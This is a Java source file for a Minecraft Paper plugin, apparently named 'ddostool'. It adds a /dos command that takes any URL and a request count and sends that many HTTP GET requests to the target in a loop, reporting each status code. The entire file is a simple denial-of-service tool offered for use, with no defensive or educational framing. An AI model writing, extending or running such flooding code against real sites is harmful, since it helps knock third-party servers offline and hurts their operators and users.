package paper.plugin.ddostool;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.CommandExecutor;
import cn.hutool.http.HttpUtil;

public class DosCommand implements CommandExecutor{
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (args.length < 2) {
            sender.sendMessage("Usage: /dos <url> <requestcount>");
            return false;
        }
        String url = args[0];
        String nrequests = args[1];
        int nrq = Integer.parseInt(nrequests);
        for (int i = 0; i < nrq; i++) {
            try {
                String statusCode = String.valueOf(HttpUtil.createGet(url).execute().getStatus());
                sender.sendMessage("请求已发送，状态码: " + statusCode);
            } catch (Exception e) {
                sender.sendMessage("请求失败: " + e.getMessage());
            }
        }
        return true;
    }

}
